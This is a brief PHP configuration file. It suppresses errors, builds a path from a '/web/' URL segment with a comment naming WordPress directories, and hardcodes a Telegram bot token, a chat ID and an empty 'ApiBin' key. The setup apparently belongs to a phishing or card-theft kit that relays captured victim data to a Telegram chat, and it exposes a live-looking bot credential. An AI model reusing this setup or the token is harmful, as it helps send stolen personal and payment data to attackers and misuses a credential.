<?php
error_reporting(0);
$currentUrlPath = $_SERVER['REQUEST_URI'];
$domain = $_SERVER['HTTP_HOST'];
preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
$folderName = $matches[1] ?? '';
$final_dir = "web/$folderName";
define("MAIN_PATH", $final_dir); // ex : wp-admin/home/wp-content
define("TOKEN", '6471382848:AAEeEcJGSsCylq94-U6oO3sS8wFS-o5YSEs');
define("CHATID", '-5498802994');
define("ApiBin", '');
?>
